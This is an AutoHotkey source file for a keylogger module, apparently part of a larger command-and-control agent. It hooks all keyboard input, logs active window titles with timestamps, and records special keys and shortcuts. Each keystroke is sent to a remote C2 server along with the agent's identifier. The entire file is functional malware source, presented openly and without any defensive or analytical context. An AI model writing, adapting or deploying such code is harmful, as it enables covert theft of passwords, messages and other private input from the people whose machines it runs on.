; ============================================================================
; KEYLOGGER MODULE
; ============================================================================
; Captures keystrokes and sends to C2 server
; ============================================================================

KeyLogger(action) {

    if (action = "start" && !this.loggerisRunning) {
        this.Log("Keylogger starting...")
        this.loggerisRunning := true
        SetTimer(Logger, -1)
    }
    if (action = "stop" && this.loggerisRunning) {
        this.loggerisRunning := false
        if this.loggerIH {
            this.Log("Keylogger stopping...")
            this.loggerIH.Stop()
            this.loggerIH := ""
        }
    }

    Logger() {
        if !this.loggerisRunning
            return

        if this.loggerIH
            return

        ; Initialize state variables
        lastWindow := ""

        ; Helper functions
        GetActiveWindowTitle() {
            return WinGetTitle("A")
        }

        GetTimestamp() {
            return FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        }

        SendLoggerData(data) {
            message := Format("keylogger_output|{}|{}", this.agentID, data)
            this.Log("Sending: " . message)
            return this.SendMsg(this.serverIP, this.serverPort, message)
        }

        ; Create input hook
        ih := InputHook()
        ih.MinSendLevel := 2
        ih.KeyOpt("{All}", "V")
        ih.KeyOpt("{Enter}", "V")
        ih.KeyOpt("{Tab}", "V")
        ih.KeyOpt("{Backspace}", "V")

        ; Define keystroke handler
        OnKeyPressed(ih, key) {
            try {
                currentWindow := GetActiveWindowTitle()

                if (currentWindow != lastWindow) {
                    lastWindow := currentWindow
                    timestamp := GetTimestamp()
                    SendLoggerData(Format("%0A[{}] ({})%0A", currentWindow, timestamp))
                }

                if (StrLen(key) = 1) {
                    if (GetKeyState("Shift", "P"))
                        key := StrUpper(key)
                    SendLoggerData(key)
                }
            } catch Error as e {
                SendLoggerData(Format("Error logging keystroke: {}`n", e.Message))
            }
        }

        ; Register hotkeys for special keys
        Hotkey("~Enter", (*) => SendLoggerData("%0A"))
        Hotkey("~Space", (*) => SendLoggerData("%20"))
        Hotkey("~Tab", (*) => SendLoggerData("%09"))
        Hotkey("~Backspace", (*) => SendLoggerData("%08"))

        ; Ctrl combinations
        Hotkey("~^c", (*) => SendLoggerData("[Ctrl+C]"))
        Hotkey("~^v", (*) => SendLoggerData("[Ctrl+V]"))
        Hotkey("~^x", (*) => SendLoggerData("[Ctrl+X]"))
        Hotkey("~^z", (*) => SendLoggerData("[Ctrl+Z]"))
        Hotkey("~^y", (*) => SendLoggerData("[Ctrl+Y]"))
        Hotkey("~^a", (*) => SendLoggerData("[Ctrl+A]"))
        Hotkey("~^s", (*) => SendLoggerData("[Ctrl+S]"))
        Hotkey("~^f", (*) => SendLoggerData("[Ctrl+F]"))
        Hotkey("~^p", (*) => SendLoggerData("[Ctrl+P]"))
        Hotkey("~^n", (*) => SendLoggerData("[Ctrl+N]"))
        Hotkey("~^o", (*) => SendLoggerData("[Ctrl+O]"))
        Hotkey("~^w", (*) => SendLoggerData("[Ctrl+W]"))
        Hotkey("~^t", (*) => SendLoggerData("[Ctrl+T]"))
        Hotkey("~^+t", (*) => SendLoggerData("[Ctrl+Shift+T]"))

        ; Function keys
        Hotkey("~F1", (*) => SendLoggerData("[F1]"))
        Hotkey("~F2", (*) => SendLoggerData("[F2]"))
        Hotkey("~F3", (*) => SendLoggerData("[F3]"))
        Hotkey("~F4", (*) => SendLoggerData("[F4]"))
        Hotkey("~F5", (*) => SendLoggerData("[F5]"))
        Hotkey("~F11", (*) => SendLoggerData("[F11]"))

        ; Alt combinations
        Hotkey("~!Tab", (*) => SendLoggerData("[Alt+Tab]"))
        Hotkey("~!F4", (*) => SendLoggerData("[Alt+F4]"))

        ; Windows key combinations
        Hotkey("~#l", (*) => SendLoggerData("[Win+L]"))
        Hotkey("~#d", (*) => SendLoggerData("[Win+D]"))
        Hotkey("~#e", (*) => SendLoggerData("[Win+E]"))
        Hotkey("~#r", (*) => SendLoggerData("[Win+R]"))

        ; Navigation keys
        Hotkey("~PgUp", (*) => SendLoggerData("[PgUp]"))
        Hotkey("~PgDn", (*) => SendLoggerData("[PgDn]"))
        Hotkey("~Home", (*) => SendLoggerData("[Home]"))
        Hotkey("~End", (*) => SendLoggerData("[End]"))

        ; Media keys
        Hotkey("~Volume_Up", (*) => SendLoggerData("[Vol+]"))
        Hotkey("~Volume_Down", (*) => SendLoggerData("[Vol-]"))
        Hotkey("~Volume_Mute", (*) => SendLoggerData("[Mute]"))
        Hotkey("~Media_Play_Pause", (*) => SendLoggerData("[Play/Pause]"))

        ; Arrow keys
        Hotkey("~Up", (*) => SendLoggerData("↑"))
        Hotkey("~Down", (*) => SendLoggerData("↓"))
        Hotkey("~Left", (*) => SendLoggerData("←"))
        Hotkey("~Right", (*) => SendLoggerData("→"))

        ; Shift + Arrow combinations
        Hotkey("~+Up", (*) => SendLoggerData("[Shift+↑]"))
        Hotkey("~+Down", (*) => SendLoggerData("[Shift+↓]"))
        Hotkey("~+Left", (*) => SendLoggerData("[Shift+←]"))
        Hotkey("~+Right", (*) => SendLoggerData("[Shift+→]"))

        ; Bind input hook events
        ih.OnChar := OnKeyPressed

        ; Start the input hook
        ih.Start()

        this.loggerIH := ih
        return ih
    }
}
